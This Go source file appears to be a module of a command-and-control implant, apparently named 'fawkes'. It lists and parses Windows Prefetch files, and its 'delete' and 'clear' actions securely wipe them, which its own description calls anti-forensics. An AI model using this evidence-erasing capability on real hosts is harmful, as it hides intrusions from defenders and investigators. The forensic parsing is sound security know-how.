//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type PrefetchCommand struct{}

func (c *PrefetchCommand) Name() string {
	return "prefetch"
}

func (c *PrefetchCommand) Description() string {
	return "Parse and manage Windows Prefetch files for forensic analysis or anti-forensics"
}

type prefetchParams struct {
	Action string `json:"action"`
	Name   string `json:"name"`
	Count  int    `json:"count"`
}

// prefetchHeader, prefetchEntry, parsePrefetchData moved to forensics_helpers.go

// prefetchOutputEntry is the JSON output format for browser script rendering
type prefetchOutputEntry struct {
	Executable string `json:"executable"`
	RunCount   uint32 `json:"run_count"`
	LastRun    string `json:"last_run"`
	FileSize   int64  `json:"file_size"`
	Hash       string `json:"hash,omitempty"`
}

func (c *PrefetchCommand) Execute(task structs.Task) structs.CommandResult {
	var params prefetchParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	if params.Action == "" {
		params.Action = "list"
	}
	if params.Count == 0 {
		params.Count = 50
	}

	switch params.Action {
	case "list":
		return prefetchList(params.Count, params.Name)
	case "parse":
		return prefetchParse(params.Name)
	case "delete":
		return prefetchDelete(params.Name)
	case "clear":
		return prefetchClear()
	default:
		return errorf("Unknown action: %s (use 'list', 'parse', 'delete', or 'clear')", params.Action)
	}
}

func getPrefetchDir() string {
	windir := os.Getenv("WINDIR")
	if windir == "" {
		windir = `C:\Windows`
	}
	return filepath.Join(windir, "Prefetch")
}

func prefetchList(count int, filter string) structs.CommandResult {
	dir := getPrefetchDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return errorf("Failed to read Prefetch directory: %v", err)
	}

	var parsed []prefetchEntry
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(strings.ToUpper(entry.Name()), ".PF") {
			continue
		}
		if filter != "" && !strings.Contains(strings.ToUpper(entry.Name()), strings.ToUpper(filter)) {
			continue
		}

		fullPath := filepath.Join(dir, entry.Name())
		info, err := entry.Info()
		if err != nil {
			continue
		}

		pe := prefetchEntry{
			FileName: entry.Name(),
			FileSize: info.Size(),
			ModTime:  info.ModTime(),
		}

		// Try to parse the prefetch file for execution details
		if pf, err := parsePrefetchFile(fullPath); err == nil {
			pe.ExeName = pf.ExeName
			pe.Hash = pf.Hash
			pe.RunCount = pf.RunCount
			pe.LastRunTime = pf.LastRunTime
		}

		parsed = append(parsed, pe)
	}

	// Sort by last modification time (most recent first)
	sort.Slice(parsed, func(i, j int) bool {
		return parsed[i].ModTime.After(parsed[j].ModTime)
	})

	if len(parsed) > count {
		parsed = parsed[:count]
	}

	output := make([]prefetchOutputEntry, 0, len(parsed))
	for _, pe := range parsed {
		name := pe.ExeName
		if name == "" {
			name = pe.FileName
		}
		lastRun := ""
		if !pe.LastRunTime.IsZero() {
			lastRun = pe.LastRunTime.Format("2006-01-02 15:04:05")
		} else {
			lastRun = pe.ModTime.Format("2006-01-02 15:04:05")
		}
		hashStr := ""
		if pe.Hash > 0 {
			hashStr = fmt.Sprintf("%08X", pe.Hash)
		}
		output = append(output, prefetchOutputEntry{
			Executable: name,
			RunCount:   pe.RunCount,
			LastRun:    lastRun,
			FileSize:   pe.FileSize,
			Hash:       hashStr,
		})
	}

	jsonBytes, err := json.Marshal(output)
	if err != nil {
		return errorf("Error: %v", err)
	}

	return structs.CommandResult{
		Output:    string(jsonBytes),
		Status:    "success",
		Completed: true,
	}
}

func prefetchParse(name string) structs.CommandResult {
	if name == "" {
		return errorResult("Name required — specify an executable name (e.g., 'CMD.EXE') or prefetch filename")
	}

	dir := getPrefetchDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return errorf("Failed to read Prefetch directory: %v", err)
	}

	var matches []string
	upperName := strings.ToUpper(name)
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(strings.ToUpper(entry.Name()), ".PF") {
			continue
		}
		if strings.Contains(strings.ToUpper(entry.Name()), upperName) {
			matches = append(matches, filepath.Join(dir, entry.Name()))
		}
	}

	if len(matches) == 0 {
		return errorf("No prefetch files matching '%s'", name)
	}

	var sb strings.Builder
	for i, path := range matches {
		if i > 0 {
			sb.WriteString("\n")
		}
		pf, err := parsePrefetchFile(path)
		if err != nil {
			sb.WriteString(fmt.Sprintf("%s: parse error: %v\n", filepath.Base(path), err))
			continue
		}

		sb.WriteString(fmt.Sprintf("File: %s\n", filepath.Base(path)))
		sb.WriteString(fmt.Sprintf("  Executable:  %s\n", pf.ExeName))
		sb.WriteString(fmt.Sprintf("  Hash:        %08X\n", pf.Hash))
		if pf.RunCount > 0 {
			sb.WriteString(fmt.Sprintf("  Run Count:   %d\n", pf.RunCount))
		}
		if !pf.LastRunTime.IsZero() {
			sb.WriteString(fmt.Sprintf("  Last Run:    %s\n", pf.LastRunTime.Format("2006-01-02 15:04:05")))
		}
		if len(pf.LastRunTimes) > 1 {
			sb.WriteString("  Run History:\n")
			for j, t := range pf.LastRunTimes {
				if !t.IsZero() {
					sb.WriteString(fmt.Sprintf("    %d. %s\n", j+1, t.Format("2006-01-02 15:04:05")))
				}
			}
		}
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func prefetchDelete(name string) structs.CommandResult {
	if name == "" {
		return errorResult("Name required — specify an executable name to delete matching prefetch files")
	}

	dir := getPrefetchDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return errorf("Failed to read Prefetch directory: %v", err)
	}

	var deleted, failed []string
	upperName := strings.ToUpper(name)
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(strings.ToUpper(entry.Name()), ".PF") {
			continue
		}
		if strings.Contains(strings.ToUpper(entry.Name()), upperName) {
			path := filepath.Join(dir, entry.Name())
			secureRemove(path)
			if _, err := os.Stat(path); err == nil {
				failed = append(failed, fmt.Sprintf("%s: still exists", entry.Name()))
			} else {
				deleted = append(deleted, entry.Name())
			}
		}
	}

	var sb strings.Builder
	if len(deleted) > 0 {
		sb.WriteString(fmt.Sprintf("Deleted %d prefetch files:\n", len(deleted)))
		for _, name := range deleted {
			sb.WriteString(fmt.Sprintf("  - %s\n", name))
		}
	}
	if len(failed) > 0 {
		sb.WriteString(fmt.Sprintf("\nFailed to delete %d files:\n", len(failed)))
		for _, f := range failed {
			sb.WriteString(fmt.Sprintf("  - %s\n", f))
		}
	}
	if len(deleted) == 0 && len(failed) == 0 {
		sb.WriteString(fmt.Sprintf("No prefetch files matching '%s'", name))
	}

	status := "success"
	if len(deleted) == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

func prefetchClear() structs.CommandResult {
	dir := getPrefetchDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		return errorf("Failed to read Prefetch directory: %v", err)
	}

	deleted := 0
	failed := 0
	for _, entry := range entries {
		if entry.IsDir() || !strings.HasSuffix(strings.ToUpper(entry.Name()), ".PF") {
			continue
		}
		path := filepath.Join(dir, entry.Name())
		secureRemove(path)
		if _, err := os.Stat(path); err == nil {
			failed++
		} else {
			deleted++
		}
	}

	return successf("Prefetch cleared: %d files deleted, %d failed\n  Directory: %s", deleted, failed, dir)
}

// parsePrefetchFile reads and parses a Windows Prefetch file.
// Handles MAM decompression (Windows 10+) then delegates to parsePrefetchData.
func parsePrefetchFile(path string) (*prefetchEntry, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	// Windows 10+ prefetch files are MAM compressed
	if len(data) >= 8 && data[0] == 0x4D && data[1] == 0x41 && data[2] == 0x4D {
		decompressed, err := decompressMAM(data)
		if err != nil {
			return nil, fmt.Errorf("MAM decompress: %v", err)
		}
		data = decompressed
	}

	return parsePrefetchData(data)
}

var (
	ntdllPF                            = windows.NewLazySystemDLL("ntdll.dll")
	procRtlDecompressBufferEx          = ntdllPF.NewProc("RtlDecompressBufferEx")
	procRtlGetCompressionWorkSpaceSize = ntdllPF.NewProc("RtlGetCompressionWorkSpaceSize")
)

const compressionFormatXpressHuff = 0x0004

// decompressMAM decompresses a MAM-compressed prefetch file (Windows 10+)
// MAM format: header (8 bytes) + Xpress Huffman compressed data
// Uses RtlDecompressBufferEx from ntdll.dll
func decompressMAM(data []byte) ([]byte, error) {
	if len(data) < 8 {
		return nil, fmt.Errorf("MAM header too small")
	}

	// MAM header: 3 bytes magic + 1 byte version + 4 bytes uncompressed size
	uncompressedSize := binary.LittleEndian.Uint32(data[4:8])
	if uncompressedSize > 10*1024*1024 { // sanity check: 10MB max
		return nil, fmt.Errorf("uncompressed size too large: %d", uncompressedSize)
	}

	// Get workspace size for decompression
	var workspaceSize uint32
	var fragWorkspaceSize uint32
	r1, _, _ := procRtlGetCompressionWorkSpaceSize.Call(
		uintptr(compressionFormatXpressHuff),
		uintptr(unsafe.Pointer(&workspaceSize)),
		uintptr(unsafe.Pointer(&fragWorkspaceSize)),
	)
	if r1 != 0 {
		return nil, fmt.Errorf("RtlGetCompressionWorkSpaceSize: 0x%X", r1)
	}

	workspace := make([]byte, workspaceSize)
	decompressed := make([]byte, uncompressedSize)
	compressed := data[8:]

	var finalSize uint32
	r1, _, _ = procRtlDecompressBufferEx.Call(
		uintptr(compressionFormatXpressHuff),
		uintptr(unsafe.Pointer(&decompressed[0])),
		uintptr(uncompressedSize),
		uintptr(unsafe.Pointer(&compressed[0])),
		uintptr(len(compressed)),
		uintptr(unsafe.Pointer(&finalSize)),
		uintptr(unsafe.Pointer(&workspace[0])),
	)
	if r1 != 0 {
		return nil, fmt.Errorf("RtlDecompressBufferEx: 0x%X", r1)
	}

	return decompressed[:finalSize], nil
}

// decodeUTF16 moved to forensics_helpers.go
